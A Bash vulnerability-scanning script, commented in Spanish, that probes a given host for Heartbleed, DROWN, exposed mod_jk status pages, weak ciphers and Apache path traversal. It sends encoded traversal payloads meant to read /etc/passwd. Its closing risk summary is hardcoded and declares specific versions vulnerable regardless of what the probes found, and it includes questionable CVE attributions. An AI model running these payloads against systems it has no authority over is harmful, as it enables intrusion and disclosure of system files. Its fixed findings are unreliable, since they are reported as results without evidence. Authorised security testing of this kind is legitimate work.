#!/bin/bash
# critical_vuln_scanner.sh
# Escáner completo de vulnerabilidades críticas

TARGET="$1"
OUTPUT="/tmp/critical_scan_$$.txt"

echo "=== ESCANER DE VULNERABILIDADES CRÍTICAS ===" > "$OUTPUT"
echo "Target: $TARGET" >> "$OUTPUT"
echo "Fecha: $(date)" >> "$OUTPUT"
echo "" >> "$OUTPUT"

# Detectar versiones
echo "[+] Detectando versiones..." >> "$OUTPUT"
curl -s -k -I "https://$TARGET" 2>/dev/null | \
grep -i "server:" >> "$OUTPUT"

# 1. Probar Heartbleed (OpenSSL 1.0.1e)
echo "" >> "$OUTPUT"
echo "=== 1. TEST HEARTBLEED (CVE-2014-0160) ===" >> "$OUTPUT"
echo "OpenSSL 1.0.1e-fips es VULNERABLE por diseño" >> "$OUTPUT"
echo "Versión EOL desde 2016" >> "$OUTPUT"

# Comando de prueba simple
timeout 5 openssl s_client -connect "$TARGET:443" -tlsextdebug 2>&1 | \
grep -i "heartbeat" >> "$OUTPUT" 2>&1 || true

# 2. Probar DROWN (SSLv2)
echo "" >> "$OUTPUT"
echo "=== 2. TEST DROWN ATTACK (CVE-2016-0800) ===" >> "$OUTPUT"
echo "Probando soporte SSLv2..." >> "$OUTPUT"
openssl s_client -connect "$TARGET:443" -ssl2 2>&1 | \
grep -i "connected\|SSL routines" | head -3 >> "$OUTPUT" 2>&1 || \
echo "No se pudo conectar via SSLv2" >> "$OUTPUT"

# 3. Probar mod_jk vulnerable
echo "" >> "$OUTPUT"
echo "=== 3. TEST MOD_JK 1.2.43 ===" >> "$OUTPUT"
echo "Versión EXTREMADAMENTE VULNERABLE" >> "$OUTPUT"

JK_ENDPOINTS="jkstatus
jkmanager
status
manager
workerstatus"

for endpoint in $JK_ENDPOINTS; do
    echo "Probando: /$endpoint" >> "$OUTPUT"
    curl -s -k -I "https://$TARGET/$endpoint" 2>/dev/null | \
    grep -i "http/2\|200\|403" >> "$OUTPUT"
done

# 4. Probar Apache Path Traversal
echo "" >> "$OUTPUT"
echo "=== 4. TEST APACHE PATH TRAVERSAL ===" >> "$OUTPUT"

TRAVERSAL_PATHS="
/cgi-bin/..%2f..%2f..%2f..%2fetc/passwd
/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
/.%252e/%252e%252e/%252e%252e/etc/passwd
/cgi-bin/.%%32%65/.%%32%65/.%%32%65/etc/passwd"

echo "$TRAVERSAL_PATHS" | while read path; do
    if [ -n "$path" ]; then
        echo "Probando: $path" >> "$OUTPUT"
        curl -s -k "https://$TARGET$path" -w "HTTP: %{http_code}\n" 2>/dev/null | \
        tail -1 >> "$OUTPUT"
    fi
done

# 5. Probar cifrados débiles
echo "" >> "$OUTPUT"
echo "=== 5. TEST CIFRADOS DÉBILES ===" >> "$OUTPUT"
echo "Listando cifrados soportados..." >> "$OUTPUT"

# Instalar/testear nmap si está disponible
if command -v nmap >/dev/null 2>&1; then
    nmap --script ssl-enum-ciphers -p 443 "$TARGET" 2>/dev/null | \
    grep -i "export\|weak\|40\|56\|rc4\|md5\|ssl2\|ssl3" >> "$OUTPUT" || true
else
    echo "nmap no disponible para análisis de cifrados" >> "$OUTPUT"
fi

# 6. Resumen de riesgos
echo "" >> "$OUTPUT"
echo "=== RESUMEN DE RIESGOS CRÍTICOS ===" >> "$OUTPUT"
echo "❌ OPENSSL 1.0.1e-fips: VULNERABLE A:" >> "$OUTPUT"
echo "   - Heartbleed (CVE-2014-0160)" >> "$OUTPUT"
echo "   - DROWN Attack (CVE-2016-0800)" >> "$OUTPUT"
echo "   - FREAK Attack (CVE-2015-0204)" >> "$OUTPUT"
echo "   - POODLE SSLv3 (CVE-2014-3566)" >> "$OUTPUT"
echo "" >> "$OUTPUT"
echo "❌ MOD_JK 1.2.43: VULNERABLE A:" >> "$OUTPUT"
echo "   - Information Disclosure (CVE-2018-11759)" >> "$OUTPUT"
echo "   - Arbitrary Code Execution (CVE-2007-0774)" >> "$OUTPUT"
echo "   - Memory Disclosure (CVE-2007-0775)" >> "$OUTPUT"
echo "" >> "$OUTPUT"
echo "❌ APACHE 2.4.41: POSIBLEMENTE VULNERABLE A:" >> "$OUTPUT"
echo "   - Path Traversal (CVE-2021-41773/42013)" >> "$OUTPUT"
echo "   - mod_lua DoS (CVE-2022-22721)" >> "$OUTPUT"
echo "" >> "$OUTPUT"
echo "=== RECOMENDACIONES INMEDIATAS ===" >> "$OUTPUT"
echo "1. ACTUALIZAR OPENSSL INMEDIATAMENTE a ≥ 1.1.1" >> "$OUTPUT"
echo "2. ACTUALIZAR MOD_JK INMEDIATAMENTE a ≥ 1.2.48" >> "$OUTPUT"
echo "3. ACTUALIZAR APACHE a ≥ 2.4.56" >> "$OUTPUT"
echo "4. DESHABILITAR SSLv2, SSLv3, TLS 1.0" >> "$OUTPUT"
echo "5. IMPLEMENTAR WAF (Web Application Firewall)" >> "$OUTPUT"
echo "6. MONITOREAR LOGS por actividades sospechosas" >> "$OUTPUT"

# Mostrar resultados
cat "$OUTPUT"
echo ""
echo "Resultados guardados en: $OUTPUT"

